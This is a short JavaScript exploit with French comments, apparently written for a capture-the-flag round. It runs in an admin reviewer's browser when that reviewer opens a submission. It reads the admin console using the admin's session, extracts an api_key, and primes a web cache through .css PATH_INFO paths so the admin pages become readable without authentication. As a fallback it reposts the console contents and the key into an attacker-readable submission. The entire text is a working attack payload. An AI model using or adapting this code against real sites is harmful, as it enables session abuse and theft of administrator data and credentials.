/* Vantage — round 1 : lire la console admin et l'exfiltrer via le cache.
   S'exécute dans le navigateur du reviewer (admin) quand il ouvre notre soumission. */
(async () => {
  const g = (u) => fetch(u, { credentials: 'include' }).then(r => r.text()).catch(() => '');
  try {
    // 1) la session admin suffit sur le chemin propre -> on lit l'overview
    const idx = await g('/admin/index.php');
    // 2) on récupère l'api_key qui apparaît dans les liens/forms de la console
    const m = idx.match(/api_key=([A-Za-z0-9_\-]+)/);
    const k = m ? m[1] : '';
    // 3) on amorce le cache : chemin en .css (donc mis en cache) + api_key en query
    //    (l'api_key satisfait l'auth malgré le PATH_INFO) -> lisible ensuite sans auth
    await g('/admin/index.php/ov.css?api_key=' + k);
    await g('/admin/review.php/rv.css?api_key=' + k);
    await g('/admin/search.php/se.css?api_key=' + k);
    // 4) filet de sécurité : si l'api_key ne débloque pas le PATH_INFO,
    //    on republie la console dans une soumission-marqueur lisible par nous
    await fetch('/tip.php', {
      method: 'POST', credentials: 'include',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: 'title=' + encodeURIComponent('SORADUMP ' + (k || 'nokey')) +
            '&body=' + encodeURIComponent(idx.slice(0, 4000))
    });
  } catch (e) {}
})();
